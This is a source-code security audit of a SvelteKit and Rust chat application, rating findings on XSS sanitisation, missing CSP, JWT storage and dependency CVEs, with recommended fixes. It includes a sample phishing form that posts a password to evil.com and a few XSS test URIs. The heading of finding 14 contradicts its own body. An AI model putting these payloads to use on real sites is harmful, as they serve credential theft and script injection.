# Wabi Security Audit — 2026-07-28

**Scope:** SvelteKit frontend + Rust wabi-server backend  
**Method:** Source code review of files listed in the audit brief plus expanded discovery  
**Commit:** HEAD on `main` (recent Notes integration)

---

## 1. NotesView.svelte — No XSS in note rendering

**Severity:** INFO (clean)

Notes content is rendered exclusively via Svelte text interpolation (`{getSnippet(note.text)}` at `NotesView.svelte:167`, `{formatTime(note.updatedAt)}` at `:168`). There is no `{@html}` binding, no `innerHTML` assignment, and no `href`/`src` attribute derived from note text in this component. Note text flows through `<textarea>` and `<input>` elements that Svelte auto-escapes.

`notesStore.ts` persists notes as JSON via `localStorage.setItem(key, JSON.stringify(value))` (`:41`) and reads them via `JSON.parse(raw)` (`:32`). Deserialized strings are never passed to `innerHTML` or `{@html}` — only to safe Svelte text bindings. This is correct.

No finding.

---

## 2. XSS in message rendering via `{@html}` — Mitigated by DOMPurify

**Severity:** MEDIUM (depends on DOMPurify correctness)

**File:** `frontend/src/lib/components/message/MessageContent.svelte:241`, `:267`, `:276`

```svelte
{@html parseMessage(messageText, message.entities || [])}
```

`parseMessage` (`frontend/src/lib/markdown.ts`) uses:
- `marked` for Markdown → HTML conversion (`:242`)
- `DOMPurify.sanitize()` with a strict allowlist (`:268-277`)

The DOMPurify config is:

```typescript
DOMPurify.sanitize(html, {
  ALLOWED_TAGS: [
    'p', 'br', 'strong', 'em', 'u', 's', 'del', 'code', 'pre',
    'a', 'img', 'blockquote', 'ul', 'ol', 'li', 'h1', 'h2', 'h3',
    'h4', 'h5', 'h6', 'hr', 'span'
  ],
  ALLOWED_ATTR: ['href', 'src', 'alt', 'class', 'title', 'target', 'rel',
    'data-spoiler', 'data-place-id', 'data-place-layer-id', 'data-place-poi-id',
    'data-place-name', 'data-ref-kind', 'data-ref-id', 'data-ref-label'],
  FORBID_TAGS: ['style', 'script'],
  FORBID_ATTR: ['style', 'onerror', 'onload'],
})
```

**Analysis:** This is a reasonable DOMPurify configuration. `href` is allowed on `<a>` but `isSafeUrl()` (`markdown.ts:133-137`) restricts to `https?:|mailto:|tel:|#|/` protocols — `javascript:` is blocked. `src` is allowed on `<img>` which could load external images (tracking pixel), but not execute script. `style` tag and `style` attribute are both forbidden.

**Risk:** Any future DOMPurify bypass (CVEs exist) would enable stored XSS in both channel messages and DMs. Also, the `SAFE_URL_PROTOCOLS` regex (`markdown.ts:131`) does not account for `data:` URIs on `<a>` or `<img>` `src`, but DOMPurify's own protocol checks may catch it.

**Recommendation:** Keep DOMPurify updated. Pin with exact version (already `3.4.2` — check for newer). Consider adding `data:` to the forbidden protocols in `isSafeUrl()` as defense-in-depth.

---

## 3. WikiChannel.svelte — XSS via `{@html renderedBody}`

**Severity:** MEDIUM

**File:** `frontend/src/lib/components/WikiChannel.svelte:181`, `:323`

```typescript
$: renderedBody = displayBody ? parseMessage(displayBody) : '';
```

```svelte
{@html renderedBody}
```

Wiki page body goes through the same `parseMessage` → DOMPurify pipeline as chat messages. Same risk profile as finding #2 — relies solely on DOMPurify.

**Recommendation:** Same as #2.

---

## 4. ReaderTabImpl.svelte — XSS via `{@html renderedDocumentHtml}` with permissive DOMPurify config

**Severity:** HIGH

**File:** `frontend/src/lib/components/ReaderTabImpl.svelte:517`

```svelte
{@html renderedDocumentHtml}
```

**File:** `frontend/src/lib/components/readerTabHelpers.ts:27-34`

```typescript
export function renderReaderHtml(content: string, format: ReaderDocumentFormat): string {
  if (!content.trim()) {
    return '<p class="reader-empty-copy">No content loaded yet.</p>';
  }
  if (format === 'markdown') return parseMessage(content);
  if (format === 'html') return DOMPurify.sanitize(content, SANITIZE_CONFIG);
  return renderPlainText(content);
}
```

The `SANITIZE_CONFIG` at `readerTabHelpers.ts:5-7`:

```typescript
const SANITIZE_CONFIG = {
  USE_PROFILES: { html: true }
};
```

**Issue:** `USE_PROFILES: { html: true }` is DOMPurify's "safe HTML" profile, which is **more permissive** than the custom allowlist in `parseMessage`. It permits `<form>`, `<input>`, `<button>`, `<select>`, `<textarea>`, `<svg>`, `<math>`, `<video>`, `<audio>`, and other tags that the chat message pipeline blocks. While DOMPurify strips `<script>` and event handlers, the profile allows interactive form elements that could be used for phishing (a rendered document could contain `<form action="https://evil.com" method="POST"><input name="password" type="password"></form>`).

**Additionally:** When `format === 'markdown'`, this shares the same DOMPurify pipeline as messages (finding #2). When `format === 'html'`, the document content is loaded from user-controlled files or pasted content — this is the Reader tab's explicit purpose, so HTML content is expected, but the sanitization is notably weaker than the message pipeline.

**Recommendation:** Use the same strict ALLOWED_TAGS/ALLOWED_ATTR configuration as `parseMessage` instead of `USE_PROFILES: { html: true }`. At minimum, add `FORBID_TAGS: ['form', 'input', 'button', 'select', 'textarea', 'svg', 'math']` to the Reader's sanitize config.

---

## 5. External App URI scheme injection in DmHub.svelte

**Severity:** LOW

**File:** `frontend/src/lib/components/DmHub.svelte:143-182`

The `testExternalApp` function validates custom URLs with `new URL()` at `:173`:

```typescript
if (app === 'custom') {
  if (!customAppUrl) {
    externalAppTestResult = 'Enter a URL first';
    return;
  }
  try {
    new URL(customAppUrl);
    window.open(customAppUrl, '_blank');
    externalAppTestResult = 'ok';
  } catch {
    externalAppTestResult = 'Invalid URL';
  }
}
```

**Issue:** `new URL()` parses `javascript:` and `data:` URIs as valid URLs:
- `new URL('javascript:alert(1)')` — succeeds
- `new URL('data:text/html,<script>alert(1)</script>')` — succeeds

`window.open('javascript:alert(1)', '_blank')` does not execute in modern Chromium/Firefox with `_blank`, but `window.open('data:text/html,...', '_blank')` can render attacker-controlled HTML in a new window context (same-origin as `about:blank`). This is a self-XSS (user must type the URL), but could be used for phishing if an attacker has write access to the machine.

**Additionally:** The predefined URIs for Obsidian (`obsidian://vault`) and Logseq (`logseq://`) are hardcoded and safe — no injection possible there.

**Mitigation:** The `customAppUrl` is stored only in-memory (not persisted to localStorage or sent to the server). The attack surface requires local machine access.

**Recommendation:** Add explicit protocol allowlisting for `customAppUrl`:
```typescript
const allowed = /^https?:\/\//i;
if (!allowed.test(customAppUrl)) throw new Error('Invalid protocol');
```

---

## 6. No CSP on main HTML responses

**Severity:** HIGH

**File:** `core/crates/wabi-server/src/main.rs:906-941`

The `serve_static` function returns index.html with only `Content-Type` and `Cache-Control` headers. There is no `Content-Security-Policy` header on the SPA entry point.

A CSP is applied only to uploaded file responses (`upload.rs:111-117`):
```
Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; img-src 'self' data:; sandbox
```

No CSP is set on:
- The SPA `index.html` page
- API responses
- WebSocket/Socket.IO endpoints

**Impact:** Without a page-level CSP, any XSS vulnerability (findings #2, #3, #4) can be weaponized without CSP restrictions. Modern CSP would block inline scripts, restrict `eval()`, and limit connection targets.

**Recommendation:** Add a `Content-Security-Policy` header to all HTML responses. Minimum recommended policy:
```
default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
connect-src 'self' ws: wss:; img-src 'self' data: blob:;
font-src 'self'; frame-ancestors 'none'; form-action 'self';
base-uri 'self'; object-src 'none'
```

---

## 7. CORS: Origin mirror with safe-local predicate — Reasonably safe

**Severity:** INFO (well-implemented)

**File:** `core/crates/wabi-server/src/main.rs:221-269`

```rust
fn build_cors_layer() -> CorsLayer {
    // ...
    let allow_origin = match allowed_origins {
        Some(origins) => { /* exact list */ }
        None => {
            tower_http::cors::AllowOrigin::predicate(|origin: &axum::http::HeaderValue, _| {
                origin.to_str()
                    .map(|s| is_safe_local_origin(s))
                    .unwrap_or(false)
            })
        }
    };
    CorsLayer::new()
        .allow_origin(allow_origin)
        .allow_credentials(true)
        // ...
}
```

The `is_safe_local_origin` function (`:273-302`) correctly rejects `localhost.evil.com` and only allows `localhost`, `127.0.0.1`, `::1`, `0.0.0.0`, and Tailscale CGNAT (`100.64.0.0/10`). Unit tests validate this behavior (`:304-368`).

`allow_credentials(true)` with the predicate-based origin is correct — credentials are only sent when the origin matches, not to arbitrary origins.

No finding.

---

## 8. JWT token storage: sessionStorage + optional localStorage persistence

**Severity:** MEDIUM

**File:** `frontend/src/lib/authSession.ts`

The JWT token is stored:
1. **Primary:** `sessionStorage` under key `wabi_auth_token:<scoped-server-url>` (`:99`)
2. **Optional (remember-me):** `localStorage` under key `wabi_persisted_auth_token:<scoped-server-url>` (`:144`)
3. **Legacy migration:** reads from `localStorage` key `authToken` on first access, then migrates to sessionStorage (`:86-89`)

**Token lifetime:** 30 days (`core/crates/wabi-server/src/api/auth.rs:382` — `Duration::days(30)`)

**Impact:** The primary storage is `sessionStorage` (cleared on tab close), which is correct. The optional `localStorage` persistence is a design tradeoff (enables "stay signed in"). An XSS vulnerability would leak the token from either storage. There is no HttpOnly cookie alternative for a SPA.

**Recommendation:** 
- Consider shorter JWT lifetime with refresh tokens
- The `setAuthToken` function at `:134-139` stores to sessionStorage — verify that token refresh logic updates both sessionStorage and localStorage consistently
- Add a prominent "log out everywhere" capability (already partially supported via `state.revoke_token()` on the backend)

---

## 9. JWT `sub` claim is a stringified i64 — no injection risk

**Severity:** INFO

**File:** `core/crates/wabi-server/src/api/auth.rs:384-386`

```rust
let claims = JwtClaims {
    sub: user_id.to_string(),
    // ...
};
```

The `sub` claim is parsed back to `i64` on validation (`auth_extractor.rs:45-48`). Using a numeric user ID as the `sub` is safe. The `ParseIntError` is properly mapped to `Err(AppError::Unauthorized(...))`.

No finding.

---

## 10. WebSocket message handling — No server-side validation of message text for XSS

**Severity:** MEDIUM

**File:** `core/crates/wabi-server/src/socketio/messages.rs:67`

```rust
let text = cmd.get("text").and_then(|v| v.as_str()).unwrap_or("").to_string();
```

The server accepts the `text` field from the client verbatim and broadcasts it to all clients in the room (`:170-195`, `:228-237`). There is no server-side sanitization, stripping, or HTML-escaping of message text.

**Analysis:** This is by design — the server is a dumb relay and the client is responsible for safe rendering (which it does via DOMPurify + `parseMessage`). However, this means any other client or API consumer that reads messages from the server must also sanitize, or accept XSS risk.

The same applies to other user-controlled fields:
- `entities` at `:194` — array of entity objects with `targetId`, `label`, `layerId`, `poiId`
- `fileUrl`, `gifUrl`, `emojiUrl` at `:184-187`
- `fileName` at `:189`
- `type` at `:179`

**Recommendation:** Add server-side output encoding for the `text` field as defense-in-depth. Even simple HTML-escaping on the server would protect against a misconfigured client that doesn't use DOMPurify. However, this would break the Markdown rendering pipeline since the client expects raw Markdown.

---

## 11. `/uploads/{filename}` path traversal protection — Well-implemented

**Severity:** INFO (secure)

**File:** `core/crates/wabi-server/src/main.rs:60-112`

The `serve_upload` handler:
1. Rejects requests containing `/`, `\`, or `..` in the filename (`:65`)
2. Uses `std::fs::canonicalize()` and verifies the resolved path is inside the uploads directory (`:73-86`)
3. Applies strict response headers including `Content-Security-Policy: default-src 'none'; ... sandbox` (`:102`)

This is correctly implemented. No finding.

---

## 12. `channelName` in detached panel URL — No open redirect

**Severity:** INFO

**File:** `frontend/src/lib/detachedPanels.ts:14-35`

The `channelName` parameter (from user-created channel names) is included as a URL query parameter in the detached panel URL. It is properly encoded via `url.searchParams.set('channelName', state.channelName)` (`:23`), which handles percent-encoding. The URL is always relative to the same origin (`/detached?kind=channel-chat&channelName=...`). The `window.open` call uses `noopener,noreferrer` (`:82`). No open redirect.

No finding.

---

## 13. Dependency CVEs

**Severity:** MEDIUM

**File:** `frontend/package.json`

- `socket.io-parser`: Overridden to `4.2.6` via `"overrides"` (`:60`) — this is a response to **CVE-2023-32695** (critical DoS in socket.io-parser <4.2.3). The override is correctly set.
- `@sveltejs/kit`: `2.59.0` — check for any recent CVEs
- `dompurify`: `3.4.2` — latest stable
- `livekit-client`: `2.18.8` — check for WebRTC-related vulnerabilities

**File:** `core/crates/wabi-server/Cargo.toml`

- `jsonwebtoken`: `>=9` — CVE-2024-28115 affects versions <9.3.0 (Rust jsonwebtoken). This allows signature confusion with `HS256` when `RS256` is expected and vice versa. The server uses symmetric secret (`EncodingKey::from_secret`) consistently for both signing and decoding, so the `alg` confusion attack is mitigated because the encoder and decoder share the same key type. Still, verify the exact version resolves >=9.3.0.
- `bcrypt`: `0.17` — CVE-2024-57687 affects versions <0.16.0 (DoS via long passwords). The server has min password length check (`password.len() < 6` at `auth.rs:75`) but no explicit max length; bcrypt 0.17 should have the fix. Verify.

**Recommendation:**
- Run `cargo audit` on the workspace to detect known vulnerabilities
- Run `npm audit` on frontend dependencies
- Add a max password length check (e.g., 128 characters) to prevent potential bcrypt DoS

---

## 14. Auth change-password at `auth.rs:320-365` — No token revocation for other sessions after password change

**Severity:** MEDIUM

**File:** `core/crates/wabi-server/src/api/auth.rs:362`

```rust
// Force re-auth on other sessions for this user.
state.revoke_user(auth.user_id).await;
```

The `change-password` handler calls `revoke_user` which revokes **all** tokens for the user, including the current caller's token. This is correct and expected — the user will need to re-login after changing their password.

However, there is no rate limiting on the `change-password` endpoint itself. While the `AppError::Unauthorized` on wrong password reveals the error to the caller, the bcrypt verification happens before error return — mitigating timing attacks.

**Recommendation:** Add rate limiting to the `change-password`, `login`, and `stepup` endpoints (already present at the middleware level for all routes at `main.rs:839-842`, but verify the rate limit state applies to these paths).

---

## 15. Step-up token — Correct two-factor auth for destructive operations

**Severity:** INFO (well-implemented)

**File:** `core/crates/wabi-server/src/auth_extractor.rs:14-18`

The step-up token system requires re-proving the password for destructive admin operations. Key properties:
- Short TTL: 600 seconds (`STEPUP_TTL_SECONDS: i64 = 600`)
- `stepup: true` claim is checked (`:160-163`)
- Subject must match the authenticated user (`:169-173`)

The step-up token is required alongside the regular bearer token for destructive operations. This is correct defense-in-depth.

No finding.

---

## 16. Revocation store — Proper token invalidation support

**Severity:** INFO (well-implemented)

**File:** `core/crates/wabi-server/src/state.rs` (revocation methods)  
**File:** `core/crates/wabi-server/src/auth_extractor.rs:105-109`

```rust
let sub = claims.sub.parse::<i64>().unwrap_or(-1);
if app_state.is_token_revoked(&claims.jti, sub, claims.iat).await {
    return Err(AppError::Unauthorized("token revoked".into()).into_response());
}
```

The revocation system supports:
1. Single `jti` revocation
2. Whole-user revocation (`revoke_user`)
3. Epoch-based revocation (`revoke_all_tokens`)

This is correct.

No finding.

---

## 17. Service Worker registration without integrity checks

**Severity:** LOW

**File:** `frontend/src/routes/+layout.svelte:87`

```typescript
navigator.serviceWorker.register(`/sw.js?v=${__WABI_SW_VERSION__}`)
```

The service worker is registered with a version query parameter but no subresource integrity hash. If an attacker can modify the `sw.js` file on the server, they can register a malicious service worker that intercepts all network requests, including API calls with JWT tokens.

**Recommendation:** Serve `sw.js` with a `Content-Security-Policy` header that includes `script-src 'self'` and consider adding integrity attributes. However, this is a minor concern since the SW is served from the same origin and the server already has path traversal protection on file serving.

---

## 18. Chat Message entity rendering — In-band `data-*` attributes from untrusted input

**Severity:** LOW

**File:** `frontend/src/lib/markdown.ts:171-192`

The entity injection in `parseMessage` creates `<span>` elements with `data-ref-id`, `data-ref-label`, `data-place-id`, etc. populated from `MessageEntity` fields that originate from message authors.

```typescript
html =
  `<span class="mention-token mention-token-${kind}" ` +
  `data-ref-kind="${escapeHtml(kind)}" ` +
  `data-ref-id="${escapeHtml(entity.targetId)}" ` +
  `data-ref-label="${escapeHtml(entity.label)}">` +
  `${escapeHtml(displayText)}` +
  `</span>`;
```

All values are passed through `escapeHtml()` (`:122-129`), which escapes `&`, `<`, `>`, `"`, and `'`. The resulting `data-ref-label` is safe as an HTML attribute value.

No finding — this is correctly escaped.

---

## Summary

| ID | Finding | Severity |
|----|---------|----------|
| 1 | NotesView.svelte renders text safely via Svelte interpolation | INFO (clean) |
| 2 | Chat message XSS via `{@html}` — mitigated by DOMPurify | MEDIUM |
| 3 | Wiki page XSS via `{@html}` — shared DOMPurify pipeline | MEDIUM |
| 4 | **Reader tab XSS via `{@html}` — permissive DOMPurify `html` profile** | **HIGH** |
| 5 | External app custom URL `new URL()` accepts `javascript:`/`data:` URIs | LOW |
| 6 | **No CSP on main HTML responses** | **HIGH** |
| 7 | CORS origin mirror is restricted to safe local origins | INFO (clean) |
| 8 | JWT stored in sessionStorage + optional localStorage | MEDIUM |
| 9 | JWT `sub` is a safe numeric string | INFO (clean) |
| 10 | WebSocket message text is not server-sanitized (by design) | MEDIUM |
| 11 | Upload path traversal protection is correct | INFO (clean) |
| 12 | Detached panel URL is safe | INFO (clean) |
| 13 | Dependency CVEs: evaluate socket.io-parser override, jsonwebtoken, bcrypt | MEDIUM |
| 14 | Password change revokes tokens correctly | MEDIUM |
| 15 | Step-up token for destructive operations is well-implemented | INFO (clean) |
| 16 | Token revocation store is correct | INFO (clean) |
| 17 | Service worker registered without integrity hash | LOW |
| 18 | Message entity attributes are properly HTML-escaped | INFO (clean) |

**Top priority fixes:**
1. **Add CSP header to HTML responses** (finding #6)
2. **Tighten Reader tab DOMPurify config** to match the message pipeline (finding #4)
3. **Add protocol allowlist for custom external app URLs** (finding #5)
4. **Run `cargo audit` / `npm audit`** and resolve any flagged CVEs (finding #13)
